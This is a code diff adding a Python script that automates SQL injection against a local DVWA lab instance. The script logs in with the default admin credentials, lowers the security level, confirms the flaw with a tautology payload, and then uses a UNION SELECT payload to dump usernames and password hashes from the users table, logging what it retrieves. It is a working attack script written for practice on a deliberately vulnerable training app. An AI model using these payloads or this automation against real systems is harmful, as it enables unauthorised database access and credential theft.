@@ -1,0 +1,132 @@
+#SQL injection (Vulnerability Assessment and Exploitation) Without LLM
+
+import requests
+from bs4 import BeautifulSoup
+import logging
+import time
+
+# Set up logging to track vulnerabilities found
+logging.basicConfig(
+    filename='vulnbrace_dvwa_logs.log', 
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
+
+# URL and login credentials for DVWA
+dvwa_url = "http://localhost/dvwa/"
+login_url = dvwa_url + "login.php"
+sqli_url = dvwa_url + "vulnerabilities/sqli/"
+security_url = dvwa_url + "security.php"
+
+# DVWA login credentials
+payload = {
+    "username": "admin",
+    "password": "password",
+    "Login": "Login"
+}
+
+# Start a session to maintain login state
+session = requests.Session()
+
+# Log into DVWA
+def login_to_dvwa():
+    start_time = time.time()
+    
+    response = session.get(dvwa_url)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    
+    # Get the CSRF token from the login form
+    csrf_token = soup.find("input", {"name": "user_token"})["value"]
+    
+    # Add CSRF token to the login payload
+    payload["user_token"] = csrf_token
+    
+    # Perform login
+    session.post(login_url, data=payload)
+    login_time = time.time() - start_time
+    logging.info(f"[*] Logged into DVWA in {login_time:.2f} seconds")
+
+# Set security level to low
+def set_security_level():
+    response = session.get(security_url)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    csrf_token = soup.find("input", {"name": "user_token"})["value"]
+    
+    # Post the security level with CSRF token
+    session.post(security_url, data={"security": "low", "seclev_submit": "Submit", "user_token": csrf_token})
+    logging.info("[*] Security level set to low")
+
+# SQL Injection test
+def test_sql_injection():
+    sqli_payload = "' OR '1'='1"
+    start_time = time.time()
+
+    # Perform SQL Injection
+    response = session.get(sqli_url, params={"id": sqli_payload, "Submit": "Submit"})
+    
+    if "First name" in response.text:
+        detection_time = time.time() - start_time
+        print("[+] SQL Injection vulnerability detected! Retrieving data...")
+        logging.info(f"[+] SQL Injection vulnerability detected using payload: {sqli_payload}")
+        logging.info(f"[+] Detection time: {detection_time:.2f} seconds")
+        extract_data(response.text)
+        return True
+    else:
+        print("[-] No SQL Injection vulnerability detected.")
+        logging.warning("[-] No SQL Injection vulnerability detected.")
+        return False
+
+# Extract user data from the HTML response and print custom messages
+def extract_data(html):
+    soup = BeautifulSoup(html, 'html.parser')
+    
+    # Extract the relevant data from <pre> tags
+    pre_tags = soup.find_all('pre')
+    
+    print("[*] User Data Retrieved:")
+    logging.info("[*] Extracted User Data:")
+    
+    for tag in pre_tags:
+        user_data = tag.get_text(strip=True)
+        print(user_data)  # Print the retrieved user data
+        logging.info(f"[*] {user_data}")
+    
+    print("[+] Data extraction complete!")
+
+## Exploit SQL Injection
+def exploit_sql_injection():
+    exploit_payload = "' UNION SELECT null, user, password FROM users -- "
+    start_time = time.time()
+
+    response = session.get(sqli_url, params={"id": exploit_payload, "Submit": "Submit"})
+    
+    soup = BeautifulSoup(response.text, 'html.parser')
+    
+    # Check if <pre> tags (where DVWA displays user data) exist and contain any data
+    pre_tags = soup.find_all('pre')
+
+    if pre_tags:
+        exploit_time = time.time() - start_time
+        print("[+] Exploiting vulnerability to retrieve user credentials...")
+        logging.info(f"[+] Exploit successful using payload: {exploit_payload}")
+        logging.info(f"[+] Exploit time: {exploit_time:.2f} seconds")
+        extract_data(response.text)
+    else:
+        print("[-] Exploit failed.")
+        logging.warning("[-] Exploit failed.")
+
+
+# Main workflow
+def run():
+    start_time = time.time()
+    
+    login_to_dvwa()
+    set_security_level()
+
+    if test_sql_injection():
+        exploit_sql_injection()
+    
+    total_time = time.time() - start_time
+    logging.info(f"[*] Total execution time: {total_time:.2f} seconds")
+
+run()
